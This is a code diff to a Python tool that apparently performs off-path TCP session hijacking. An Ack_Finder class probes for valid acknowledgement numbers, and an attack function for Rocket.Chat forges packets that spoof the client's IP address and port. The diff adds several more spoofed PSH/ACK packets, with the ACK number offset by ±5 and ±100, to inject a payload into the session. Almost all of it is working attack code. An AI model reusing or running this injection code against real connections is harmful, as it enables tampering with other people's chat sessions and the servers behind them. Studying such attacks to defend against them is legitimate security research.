@@ -204,25 +204,26 @@ class Ack_Finder:
 
     def __C(self, ls, lb, rb):
         D = 2
-        # revise
+        
+        la = []
         for i in range(0, len(ls)):
-            ls[i] = ls[i] if ls[i] >= 0 else ls[i] + (1 << 32)
+            la.append(ls[i] if ls[i] >= 0 else ls[i] + (1 << 32))
 
         in_bound = lb
         for i in range(0, D):
             time.sleep(self.__sleep_time)
-            nb = self.check_new_point_ack(ls)
+            nb = self.check_new_point_ack(la)
             if nb is None:
                 i -= 1
             else:
                 in_bound = max(in_bound, nb)
-
-        return in_bound
+            print(in_bound)
+        return ls[la.index(in_bound)]
 
     def find_left_bound_ack(self):
         rb = self.ack_check_start
         lb = rb - (1 << 31)
-        L = 50
+        L = 100
 
         while (rb - lb) >= L:
             step = int((rb - lb) / L)
@@ -418,5 +419,19 @@ def attack_action_rocketchat(client_ip, server_ip, client_port, server_port, seq
     send_list.append(IP(src=client_ip, dst=server_ip) /
                      TCP(sport=client_port, dport=server_port, seq=seq + 1, ack=ack, flags='PA') /
                      load)
+    send_list.append(IP(src=client_ip, dst=server_ip) /
+                     TCP(sport=client_port, dport=server_port, seq=seq + 1, ack=ack+5, flags='PA') /
+                     load)
+    send_list.append(IP(src=client_ip, dst=server_ip) /
+                     TCP(sport=client_port, dport=server_port, seq=seq + 1, ack=ack-5, flags='PA') /
+                     load)
+    send_list.append(IP(src=client_ip, dst=server_ip) /
+                     TCP(sport=client_port, dport=server_port, seq=seq + 1, ack=ack+100, flags='PA') /
+                     load)
+    send_list.append(IP(src=client_ip, dst=server_ip) /
+                     TCP(sport=client_port, dport=server_port, seq=seq + 1, ack=ack-100, flags='PA') /
+                     load)
+
 
     send(send_list, iface=ifname, verbose=False)
+
